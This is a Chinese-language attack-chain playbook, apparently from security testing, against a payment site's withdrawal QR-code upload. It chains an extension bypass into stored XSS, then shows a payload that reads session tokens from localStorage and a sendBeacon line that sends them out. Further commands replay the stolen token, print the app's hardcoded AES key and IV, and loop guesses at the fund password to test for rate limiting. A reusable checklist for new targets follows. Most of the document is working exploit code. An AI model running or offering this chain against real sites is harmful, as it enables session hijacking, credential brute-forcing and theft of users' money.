# 组合链：任意后缀上传 → 同源存储型 XSS → localStorage 会话窃取 → 资金密码 oracle

## 1) 上传 payload（会员 token，multipart 谎报 Content-Type）
```bash
curl -sS -k --http1.1 -x http://127.0.0.1:7892 \
  --connect-to example.com:443:203.0.113.88:443 \
  -H "Authorization: Bearer <member-JWT>" \
  -F "file=@payload.html;filename=payload.html;type=image/jpeg" \
  https://example.com/api/v1/withdraw/upload-qrcode
# => {"code":0,"message":"上传成功","data":{"url":"/uploads/qrcode/<date>/<rand>_<uid>.html"}}
# 回读：GET /uploads/qrcode/<date>/<rand>_<uid>.html  -> 200 Content-Type: text/html（脚本被原样执行）
```

## 2) payload.html（纯读取 + 回显，无外发/无写操作）
```html
<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><title>qrcode</title></head>
<body><h3>upload ok</h3><pre id="xc">starting...</pre>
<script>
(function(){
  var out={origin:location.origin,href:location.href,cookie:document.cookie,keys:[],ls:{},ss:{}};
  try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);out.keys.push(k);out.ls[k]=localStorage.getItem(k);}}catch(e){}
  try{for(var i=0;i<sessionStorage.length;i++){var k=sessionStorage.key(i);out.ss[k]=sessionStorage.getItem(k);}}catch(e){}
  out.hch_token=out.ls['hch_token']||null; out.hch_refresh_token=out.ls['hch_refresh_token']||null;
  window.__XC__=out;
  document.title='XC-LEAK hch_token='+String(out.hch_token).slice(0,24)+' (len '+String(out.hch_token).length+')';
  document.getElementById('xc').textContent=JSON.stringify(out,null,1);
})();
</script></body></html>
```

## 3) 取走凭据的两种落证方式
- 页面内：`document.title` + DOM 回显 → 截图即证据（推荐，零外发）。
- 外带：`navigator.sendBeacon('http://127.0.0.1:8899/leak', new Blob([JSON.stringify(out)],{type:'text/plain'}))`
  注意：**http:// 外部接收端会被 HTTPS 页面的混合内容策略拦掉；只有 127.0.0.1/localhost 属 potentially-trustworthy origin 才放行**（本链即用本机回环接收端固定证据）。

## 4) 用窃取到的 token 验证「token = 账号」
```bash
curl -k -x http://127.0.0.1:7892 --connect-to <host>:443:<ip>:443 \
  -H "Authorization: Bearer <STOLEN-TOKEN>" https://<host>/api/v1/auth/profile
# 响应 AES-CBC 加密（X-Encrypted: 1），key=QD2024SecretKey1234567890ABCDEF0 iv=QD2024IV12345678
# 解密后 -> {"code":0,"data":{"user":{"id":403,"username":"...","balance":"..."}}}
```

## 5) 资金密码 oracle（判断是否可无限试）
```bash
for i in 1 2 3 4 5; do
  curl -k -x http://127.0.0.1:7892 --connect-to <host>:443:<ip>:443 \
    -H "Authorization: Bearer <STOLEN-TOKEN>" -H "Content-Type: application/json" \
    -d '{"password":"987654"}' https://<host>/api/v1/security/verify-fund-pwd
  sleep 5.6
done
# 命中条件：全程 200 + 同一错误文案，无 429 / 无失败计数 / 无锁定 → 可无限试
# 门闩确认（零净变化 old=new，绝不改真实口令）：
curl ... -d '{"oldPassword":"987654","newPassword":"987654","confirmPassword":"987654"}' \
  https://<host>/api/v1/auth/change-fund-password   # -> {"code":1001,"message":"原资金密码错误"}
```

## 判定清单（换目标时逐条核对）
| 环节 | 判据 |
| --- | --- |
| 上传点 | 是否校验扩展名；上传后 Content-Type 由谁决定（nginx 按扩展名 → .html/.svg/.shtml 可执行） |
| 同源 | payload 与业务前端是否同 host（同源才能读 localStorage / cookie） |
| 凭据位置 | JWT 存 localStorage（`hch_token`）→ XSS 可直接读；存 httpOnly cookie 则读不到（需走 CSRF 路线） |
| token 有效性 | 拿到即调 /auth/profile 验证，并用响应里的 uid 证明身份 |
| oracle 限速 | 连打 5 次看 429 / 计数 / 锁定；注意很多实现在比对前有「格式门」（如 6 位数字），否则测不出真行为 |
